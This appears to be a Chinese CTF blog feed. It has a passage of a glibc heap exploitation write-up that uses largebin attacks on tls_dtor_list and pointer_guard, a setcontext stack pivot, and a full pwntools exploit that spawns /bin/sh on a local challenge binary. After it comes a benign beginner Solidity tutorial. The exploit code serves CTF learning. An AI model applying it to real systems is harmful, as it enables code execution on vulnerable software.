<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x428</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>)  <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)  <span class="comment">#4</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x16b0</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123022279.png"
                      class=""
                >

<p>然后free掉一个和0x430那个larginbin属于一个大小范围的，但又比0x430小的chunk3，修改以及在largebin中的那个chunk的bk_nextsize域为<code>target_addr-0x20</code>，然后申请一个大chunk，从topchunk分配，并把chunk3置入largebin，触发largebin attack，往<code>target_addr</code>写chunk3的地址。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(tls_dtor_list-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x500</span>)        <span class="comment">#trigger largebin attack 1</span></span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123458788.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123536544.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123654313.png"
                      class=""
                >

<p>然后故技重施，再来次largebin attack改<code>tcbhead_t-&gt;pointer_guard</code>为一个我们知道的堆地址，这里我们可以先把<code>fake_dtor_list-&gt;next</code>改成一个可控的堆区域先，方便后面栈迁移。这里<code>fs_base</code>的地址相对于libc基址是固定的，计算一下就可以得出。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">3</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(heap_base+<span class="number">0x1af0</span>))    <span class="comment">#next=chunk2-&gt;data</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x4f8</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x600</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(fs_base+<span class="number">0x30</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x600</span>)        <span class="comment">#trigger largebin attack 2</span></span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241127183520245.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128124109770.png"
                      class=""
                >

<p>这里的key就是我们写到<code>fs:0x30</code>的地址，最后利用chunk2把chunk3（fake_dtor_list）的func域改为加密后的<code>setcontext+61</code>，由于我们之前把next域设置为了chunk2的data域的地址，所以这里rdx就会指向chunk2的data域，这样我们在改chunk2时，设置rsp为一个可写地址，rbp为栈迁移目标地址-8，rcx为<code>leave;ret</code>地址，最终就能栈迁移到我们可控的堆段上，这里我们迁移到了chunk8的data域，chunk8写rop链即可。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f2e7</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000029db4</span></span><br><span class="line"></span><br><span class="line">key = heap_base + <span class="number">0x3260</span></span><br><span class="line">chunk8 = heap_base + <span class="number">0x3770</span></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x78</span> + p64(chunk8-<span class="number">8</span>)  <span class="comment">#rbp</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(heap_base+<span class="number">0x5000</span>)+p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x420</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(((setcontext+<span class="number">61</span>)^key)&lt;&lt;<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x428</span>,payload)  </span><br><span class="line"></span><br><span class="line">rop = p64(pop_rdi_ret)+p64(chunk8+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_r12_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rax_ret)+p64(<span class="number">0x3b</span>)+p64(syscall)+<span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x58</span>,rop)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">end()</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128124932862.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128124955592.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128125025834.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128125109454.png"
                      class=""
                >

<p>exp</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./poc&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;pwn.challenge.ctf.show&quot;,28310)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./poc&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;libc_base:&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x80e50</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">tls_dtor_list = libc_base - <span class="number">0x2918</span></span><br><span class="line">fs_base = libc_base - <span class="number">0x28c0</span></span><br><span class="line"><span class="comment"># fs_base = libc_base - 0x3260</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029139</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000004da83</span></span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x428</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>)  <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)  <span class="comment">#4</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x16b0</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(tls_dtor_list-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x500</span>)        <span class="comment">#trigger largebin attack 1</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(heap_base+<span class="number">0x1af0</span>))    <span class="comment">#next=chunk2-&gt;data</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x4f8</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x600</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(fs_base+<span class="number">0x30</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x600</span>)        <span class="comment">#trigger largebin attack 2</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f2e7</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000029db4</span></span><br><span class="line"></span><br><span class="line">key = heap_base + <span class="number">0x3260</span></span><br><span class="line">chunk8 = heap_base + <span class="number">0x3770</span></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x78</span> + p64(chunk8-<span class="number">8</span>)  <span class="comment">#rbp</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(heap_base+<span class="number">0x5000</span>)+p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x420</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(((setcontext+<span class="number">61</span>)^key)&lt;&lt;<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x428</span>,payload)  </span><br><span class="line"></span><br><span class="line">rop = p64(pop_rdi_ret)+p64(chunk8+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_r12_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rax_ret)+p64(<span class="number">0x3b</span>)+p64(syscall)+<span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x58</span>,rop)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">end()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>solidity&amp;blockchain初探</title>
    <url>/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<p>solidity这个语言广泛运用与智能合约的编写，想要入门区块链就得先了解这个语言。该语言其实与c语言用法类似。在solidity语言中，标识执行账户是用地址实现的，比如我们MetaMask中创建的Account的地址或是某个合约的地址。</p>
<h3 id="1-一些基本概念与工具站"><a href="#1-一些基本概念与工具站" class="headerlink" title="1.一些基本概念与工具站"></a>1.一些基本概念与工具站</h3><h4 id="1）账户"><a href="#1）账户" class="headerlink" title="1）账户"></a>1）账户</h4><p><strong>外部账户</strong></p>
<p>外部账户是由人创建的，可以存储以太币，是由公钥和私钥控制的账户。每个外部账户拥有一对公私钥，这对密钥用于签署交易，它的地址由公钥决定。外部账户不能包含以太坊虚拟机（EVM）代码。</p>
<p>一个外部账户具有以下特性</p>
<ul>
<li>拥有一定的 Ether</li>
<li>可以发送交易、通过私钥控制</li>
<li>没有相关联的代码</li>
</ul>
<p><strong>合约账户</strong> </p>
<p>合约账户是由外部账户创建的账户，包含合约代码。合约账户的地址是由合约创建时合约创建者的地址，以及该地址发出的交易共同计算得出的。</p>
<p>一个合约账户具有以下特性</p>
<ul>
<li>拥有一定的 Ether</li>
<li>有相关联的代码，代码通过交易或者其他合约发送的调用来激活</li>
<li>当合约被执行时，只能操作合约账户拥有的特定存储</li>
</ul>
<h4 id="2）合约"><a href="#2）合约" class="headerlink" title="2）合约"></a>2）合约</h4><p>在区块链和智能合约的上下文中，合约通常是指一种程序或协议，能够在区块链上自动执行、控制或文档化法律事件和行动。以下是合约的一些关键特征：</p>
<ol>
<li><strong>智能合约</strong>：智能合约是一种自执行的合约，其中协议的条款以代码形式写入，运行在区块链上。它们能够自动执行合约条款，减少对中介的依赖。</li>
<li><strong>去中心化</strong>：合约在区块链上运行，没有单一控制点，这使得合约更加透明和安全。</li>
<li><strong>不可篡改性</strong>：一旦合约部署到区块链上，其内容就无法更改，这提供了强有力的防篡改保障。</li>
<li><strong>透明性</strong>：合约的代码和执行是公开的，任何人都可以查看，从而提高了信任度。</li>
<li><strong>自动执行</strong>：合约可以根据预设条件自动执行，省去人工干预的需要。例如，当某个条件被满足时，合约会自动转移资产。</li>
<li><strong>多种用途</strong>：合约可以用于多种场景，如金融交易、身份验证、供应链管理、投票系统等。</li>
</ol>
<h4 id="3）常用网站及插件"><a href="#3）常用网站及插件" class="headerlink" title="3）常用网站及插件"></a>3）常用网站及插件</h4><ul>
<li>MetaMask插件：可以创建属于自己的以太网账户，拥有一个地址，其相当于一个钱包，存着你不同网络中的以太币。</li>
<li><a class="link"   href="https://remix.ethereum.org/" >Remix<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>：一个在线IDE，用于编辑合约以及与合约交互。</li>
<li><a class="link"   href="https://faucets.chain.link/" >Fauctes<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>：水龙头，可以用来免费获取测试网络中免费的货币。</li>
<li><a class="link"   href="https://app.infura.io/" >infura<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>：可以获取apikey，用于web3开发测试。</li>
</ul>
<h3 id="2-存储类型"><a href="#2-存储类型" class="headerlink" title="2.存储类型"></a>2.<strong>存储类型</strong></h3><p>Solidity 主要有三种存储类型：</p>
<ul>
<li><strong>storage</strong>：永久存储，存储在区块链上，所有合约状态变量（如 <code>uint256 totalSupply;</code>）都是存储在这里。每次修改都会消耗 gas。</li>
<li><strong>memory</strong>：临时存储，存储在内存中，生命周期仅在当前调用期间。函数调用结束后，数据会被清除。适用于需要临时使用的数据，如函数内部的计算结果。</li>
<li><strong>calldata</strong>：用于函数参数的只读数据存储位置，数据存在于外部调用时的输入中，通常用于优化 gas 使用。</li>
</ul>
<h3 id="3-修饰符"><a href="#3-修饰符" class="headerlink" title="3.修饰符"></a>3.修饰符</h3><h4 id="1）访问修饰符"><a href="#1）访问修饰符" class="headerlink" title="1）访问修饰符"></a>1）<strong>访问修饰符</strong></h4><ul>
<li>**<code>public</code>**：函数或变量可以被任何合约或外部账户访问。</li>
<li>**<code>private</code>**：函数或变量只能在定义它的合约内部访问，其他合约无法访问。</li>
<li>**<code>internal</code>**：函数或变量只能在当前合约及其子合约中访问，外部合约无法访问。</li>
<li>**<code>external</code>**：函数只能被外部账户或其他合约调用，不能在合约内部调用。</li>
</ul>
<h4 id="2）状态修饰符"><a href="#2）状态修饰符" class="headerlink" title="2）状态修饰符"></a>2）<strong>状态修饰符</strong></h4><ul>
<li>**<code>view</code>**：函数不会修改区块链状态，且可以读取合约的状态变量。调用此函数不会消耗 gas。</li>
<li>**<code>pure</code>**：函数不读取或修改任何状态变量，也不访问任何合约的状态。它只能使用传入的参数。调用此函数同样不会消耗 gas。</li>
<li>**<code>payable</code>**：函数可以接收 ETH。用于处理涉及资金转移的功能。</li>
</ul>
<h4 id="3）其他常用修饰符"><a href="#3）其他常用修饰符" class="headerlink" title="3）其他常用修饰符"></a>3）<strong>其他常用修饰符</strong></h4><ul>
<li>**<code>require</code>**：用于验证条件是否为真，如果条件不满足，则抛出异常并撤销交易。常用于输入验证和权限检查。</li>
<li>**<code>assert</code>**：用于检查不应发生的条件，如果条件不满足，则抛出异常并撤销交易。通常用于内部错误和不变性验证。</li>
<li>**<code>revert</code>**：显式撤销交易，并可以返回错误消息。与 <code>require</code> 类似，但可以用于更复杂的条件检查。</li>
</ul>
<h4 id="4）自定义修饰符"><a href="#4）自定义修饰符" class="headerlink" title="4）自定义修饰符"></a>4）自定义修饰符</h4><p>常见的是用于权限控制。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">modifier onlyOwner &#123;</span><br><span class="line">    require(msg.sender == owner, &quot;Not the contract owner&quot;);</span><br><span class="line">    _;			//_;用于替换实际的执行逻辑</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function restrictedFunction() public onlyOwner &#123;</span><br><span class="line">    // 只有合约的拥有者可以执行此函数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="5）Fallback-函数"><a href="#5）Fallback-函数" class="headerlink" title="5）Fallback 函数"></a>5）<strong>Fallback 函数</strong></h4><p>特殊的函数，当合约接收到 ETH 但没有匹配的函数调用时会被执行。可以用于接收资金。</p>
<h3 id="4-常用内置函数以及全局变量"><a href="#4-常用内置函数以及全局变量" class="headerlink" title="4.常用内置函数以及全局变量"></a>4.常用内置函数以及全局变量</h3><ul>
<li><code>abi.encodePacked</code> 是 Solidity 中的一个内置函数，用于将多个参数编码为一个字节数组。它在处理数据时非常有用，特别是在需要进行哈希计算、合约交互或其他数据处理时。</li>
<li><code>Keccak256</code>： 将输入数据（无论大小）转换为固定长度的输出（256 位），即 32 字节的哈希值。</li>
<li><code>msg.sender</code>：指向当前运行合约账户的地址</li>
<li><code>tx.origin</code>：存着整个调用链最原始的调用者的地址，及交易的原始发起方</li>
</ul>
<h3 id="5-从示例看基础语法"><a href="#5-从示例看基础语法" class="headerlink" title="5.从示例看基础语法"></a>5.从示例看基础语法</h3><p>example：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// WelcomeSHCTF2024.sol</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract WelcomeSHCTF2024 &#123;</span><br><span class="line"></span><br><span class="line">    string public storedFlag;</span><br><span class="line"></span><br><span class="line">    constructor(string memory flag) &#123;</span><br><span class="line">        string memory xorResult = xorWithSHCTF(flag);</span><br><span class="line">        storedFlag = xorResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function xorWithSHCTF(string memory flag) internal pure returns (string memory) &#123;</span><br><span class="line">        bytes memory flagBytes = bytes(flag);</span><br><span class="line">        bytes memory xorKey = bytes(&quot;shctf&quot;);</span><br><span class="line">        bytes memory result = new bytes(flagBytes.length);</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; flagBytes.length; i++) &#123;</span><br><span class="line">            result[i] = bytes1(uint8(flagBytes[i]) ^ uint8(xorKey[i % xorKey.length]));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return string(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function verifyXORedFlag(string memory inputFlag) public view returns (bool) &#123;</span><br><span class="line">        return keccak256(abi.encodePacked(storedFlag)) == keccak256(abi.encodePacked(xorWithSHCTF(inputFlag)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>pragma solidity ^0.8.0;</code>：指明合约是用 Solidity 编写的，并且要求编译器版本为 0.8.0 或更高。</li>
<li><code>contract</code>：中文译为合约，类似与class，实际上就是声明一个对象。</li>
<li><code>string private storedFlag</code>：这个就很熟悉了，就是类型+访问修饰符+变量名的组合，声明一个变量</li>
<li><code>constructor(params)&#123;&#125;</code>：这个就是该合约的构造函数，在创建时会接受参数并初始化</li>
<li><code>function</code>：声明一个方法，参数可以带上修饰符，后面也可以跟上若干修饰符</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface IWelcomeSHCTF2024 &#123;</span><br><span class="line">    function verifyXORedFlag(string memory inputFlag) external view returns (bool);</span><br><span class="line">    function storedFlag() external view returns (string memory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exp&#123;</span><br><span class="line">    IWelcomeSHCTF2024 public tar;</span><br><span class="line"></span><br><span class="line">    constructor(address contractAddress) &#123;</span><br><span class="line">        // 使用给定的地址初始化合约实例</span><br><span class="line">        tar = IWelcomeSHCTF2024(contractAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function xorWithSHCTF(string memory flag) internal pure returns (string memory) &#123;</span><br><span class="line">        bytes memory flagBytes = bytes(flag);</span><br><span class="line">        bytes memory xorKey = bytes(&quot;shctf&quot;);</span><br><span class="line">        bytes memory result = new bytes(flagBytes.length);</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; flagBytes.length; i++) &#123;</span><br><span class="line">            result[i] = bytes1(uint8(flagBytes[i]) ^ uint8(xorKey[i % xorKey.length]));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return string(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getFlag() public view returns (string memory) &#123;</span><br><span class="line">        // 调用 WelcomeSHCTF2024 合约的 verifyXORedFlag 函数</span><br><span class="line">        return xorWithSHCTF(tar.storedFlag());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们也可以写一个与上述实例相交互的脚本，这里我们假设上面的storedFlag是个public变量，其中要先定义一个<code>interface</code>接口，里面要写这个接口中能被外部调用的方法，也就是有external或public修饰的方法，其具体定义可以直接复制源码中方法的定义。这样定义之后，我们就可以通过传入合约实例的地址，来创建这么一个接口实例，然后就能调用该实例对外公开的方法。要访问属性的话要通过getter方法，也就是多的一句<code>function storedFlag() external view returns (string memory);</code>来实现属性的接口调用。我们可以在本地做实验以验证。</p>
<h5 id="remix合约部署"><a href="#remix合约部署" class="headerlink" title="remix合约部署"></a>remix合约部署</h5><p>可以先创建一个新的工作区，选择default project就行。然后在contracts目录下新建自己合约文件，如<code>WelcomeSHCTF2024.sol</code>以及<code>exp.sol</code>，然后选择编译器版本后进行编译，之后转到<code>Deploy &amp; run transactions</code>界面。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005161027491.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005161608582.png"
                      class=""
                >

<p>在环境上选Remix VM（与实际的测试网交互要选WalletConnect来连接到自己的账户），然后我们可以在deploy部署前输入一个flag字符串，作为该合约的constructor的参数。点击deploy进行合约的部署。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005161816606.png"
                      class=""
                >

